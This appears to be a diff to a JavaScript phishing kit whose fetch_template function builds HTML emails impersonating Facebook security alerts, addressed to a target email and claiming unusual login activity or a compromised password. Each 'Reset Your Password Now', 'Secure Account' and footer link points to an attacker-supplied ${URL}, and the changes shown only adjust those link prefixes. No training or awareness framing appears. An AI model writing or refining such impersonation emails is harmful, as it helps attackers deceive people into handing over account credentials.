@@ -119,8 +119,8 @@ export default async function fetch_template(type = 2, username = null, target_e
             </ul>
             
             <div style="text-align: center; margin: 30px 0;">
-                <a href="http://${URL}/facebook/secure" class="button">Review Login Activity</a>
-                <a href="http://${URL}/facebook/secure" class="button button-secondary">Secure Account</a>
+                <a href="${URL}/facebook/secure" class="button">Review Login Activity</a>
+                <a href="${URL}/facebook/secure" class="button button-secondary">Secure Account</a>
             </div>
             
             <p style="font-size: 14px; color: #65676b;">
@@ -136,9 +136,9 @@ export default async function fetch_template(type = 2, username = null, target_e
         <div class="footer">
             <p>
                 This message was sent to ${target_email}.<br>
-                <a href="http://${URL}" style="color: #1877f2; text-decoration: none;">Help Center</a> • 
-                <a href="http://${URL}" style="color: #1877f2; text-decoration: none;">Privacy Policy</a> • 
-                <a href="http://${URL}" style="color: #1877f2; text-decoration: none;">Unsubscribe</a>
+                <a href="${URL}" style="color: #1877f2; text-decoration: none;">Help Center</a> • 
+                <a href="${URL}" style="color: #1877f2; text-decoration: none;">Privacy Policy</a> • 
+                <a href="${URL}" style="color: #1877f2; text-decoration: none;">Unsubscribe</a>
             </p>
             <p style="font-size: 12px; color: #8a8d91;">
                 © 2024 Facebook, Inc., 1 Hacker Way, Menlo Park, CA 94025
@@ -208,7 +208,7 @@ export default async function fetch_template(type = 2, username = null, target_e
                         </div>
                         
                         <div style="text-align: center; margin: 35px 0;">
-                            <a href="http://${URL}" 
+                            <a href="${URL}" 
                                style="background: #1877f2; color: white; text-decoration: none; padding: 14px 28px; border-radius: 6px; font-weight: bold; display: inline-block;">
                                 Review Account Activity Now
                             </a>
@@ -219,8 +219,8 @@ export default async function fetch_template(type = 2, username = null, target_e
                         
                         <div style="font-size: 14px; color: #65676b; padding: 15px; background: #f8f9fa; border-radius: 6px; margin-top: 30px;">
                             <strong>Need help?</strong><br>
-                            Visit our <a href="http://${URL}" style="color: #1877f2;">Help Center</a> or 
-                            <a href="http://${URL}" style="color: #1877f2;">contact support</a>.
+                            Visit our <a href="${URL}" style="color: #1877f2;">Help Center</a> or 
+                            <a href="${URL}" style="color: #1877f2;">contact support</a>.
                         </div>
                     </td>
                 </tr>
@@ -231,9 +231,9 @@ export default async function fetch_template(type = 2, username = null, target_e
                         <p>This email was sent to ${target_email} because we detected unusual activity on your Facebook account.</p>
                         
                         <p style="margin-top: 20px;">
-                            <a href="http://${URL}" style="color: #1877f2; text-decoration: none;">Data Policy</a> • 
-                            <a href="http://${URL}" style="color: #1877f2; text-decoration: none;">Terms</a> • 
-                            <a href="http://${URL}" style="color: #1877f2; text-decoration: none;">Unsubscribe</a>
+                            <a href="${URL}" style="color: #1877f2; text-decoration: none;">Data Policy</a> • 
+                            <a href="${URL}" style="color: #1877f2; text-decoration: none;">Terms</a> • 
+                            <a href="${URL}" style="color: #1877f2; text-decoration: none;">Unsubscribe</a>
                         </p>
                         
                         <p style="font-size: 12px; margin-top: 20px;">
@@ -278,7 +278,7 @@ export default async function fetch_template(type = 2, username = null, target_e
         Our security systems have detected that your current password may be compromised. To protect your account and personal information, we require you to update your password.</p>
         
         <div style="text-align: center; margin: 30px 0;">
-            <a href="http://${URL}/facebook/reset"
+            <a href="${URL}/facebook/reset"
                style="background: #4267B2; color: white; text-decoration: none; padding: 15px 40px; border-radius: 6px; font-size: 16px; font-weight: bold; display: inline-block;">
                 Reset Your Password Now
             </a>
@@ -289,7 +289,7 @@ export default async function fetch_template(type = 2, username = null, target_e
         
         <div style="border-top: 1px solid #eee; padding-top: 20px; margin-top: 30px; font-size: 14px; color: #666;">
             <p><strong>Need help?</strong><br>
-            Visit our <a href="http://${URL}" style="color: #385898;">Help Center</a> for more information about account security.</p>
+            Visit our <a href="${URL}" style="color: #385898;">Help Center</a> for more information about account security.</p>
             
             <p>This is an automated security message from Facebook. Please do not reply to this email.</p>
         </div>
@@ -298,10 +298,10 @@ export default async function fetch_template(type = 2, username = null, target_e
     <div style="background: #f5f6f7; padding: 20px; text-align: center; font-size: 12px; color: #8a8d91; border-top: 1px solid #dddfe2;">
         <p>Facebook, Inc., 1 Hacker Way, Menlo Park, CA 94025</p>
         <p>
-            <a href="http://${URL}/facebook/about" style="color: #8a8d91; text-decoration: none;">About</a> • 
-            <a href="http://${URL}" style="color: #8a8d91; text-decoration: none;">Privacy</a> • 
-            <a href="http://${URL}" style="color: #8a8d91; text-decoration: none;">Terms</a> • 
-            <a href="http://${URL}/facebook/ads" style="color: #8a8d91; text-decoration: none;">Ad Choices</a>
+            <a href="${URL}" style="color: #8a8d91; text-decoration: none;">About</a> • 
+            <a href="${URL}" style="color: #8a8d91; text-decoration: none;">Privacy</a> • 
+            <a href="${URL}" style="color: #8a8d91; text-decoration: none;">Terms</a> • 
+            <a href="${URL}" style="color: #8a8d91; text-decoration: none;">Ad Choices</a>
         </p>
     </div>
 </div>`
